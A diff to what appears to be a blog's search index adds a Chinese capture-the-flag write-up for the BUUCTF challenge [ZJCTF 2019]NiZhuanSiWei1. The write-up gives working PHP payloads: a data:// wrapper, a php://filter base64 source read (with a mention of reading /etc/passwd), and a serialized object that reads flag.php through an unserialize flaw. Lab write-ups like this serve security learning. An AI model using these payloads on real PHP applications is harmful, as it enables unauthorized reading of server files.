@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>BUU 3-1</title>
+      <link href="/2024/03/01/2024-03-01-BUU-3-1/"/>
+      <url>/2024/03/01/2024-03-01-BUU-3-1/</url>
+      
+        <content type="html"><![CDATA[<hr /><h3 id="待完成的任务还有好多呀"><a class="markdownIt-Anchor" href="#待完成的任务还有好多呀"></a> 待完成的任务还有好多呀</h3><ul><li>PHP伪协议</li><li>反序列化</li><li>python 一些框架漏洞(感觉好多都是Cookie的问题)以后简称~~<mark>Cookie的秘密</mark>~~算了</li><li>文件上传user.ini型</li><li>SQL注入之~360度花式注入</li></ul><hr /><h2 id="zjctf-2019nizhuansiwei1"><a class="markdownIt-Anchor" href="#zjctf-2019nizhuansiwei1"></a> [ZJCTF 2019]NiZhuanSiWei1</h2><p><img src="https://webpage-images.pages.dev/202403011123822.png" alt="" title="图片" /></p><p><code>file_get_contents($text,'r')</code>是<mark>读取文件的内容</mark>，说明我们首先要上传一个文件，并且它的内容还得是*&quot;welcome to the zjctf&quot;*，我们考虑用<code>data协议</code>，data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure><p>这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用，</p><p>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=useless.php</span></span><br></pre></td></tr></table></figure><p>读到的<code>useless.php</code>内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//f7fe53fb-3576-4fda-8f53-940c07cdb140.node5.buuoj.cn:81/?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BUU 2-29</title>
       <link href="/2024/02/29/BUU1/"/>
       <url>/2024/02/29/BUU1/</url>
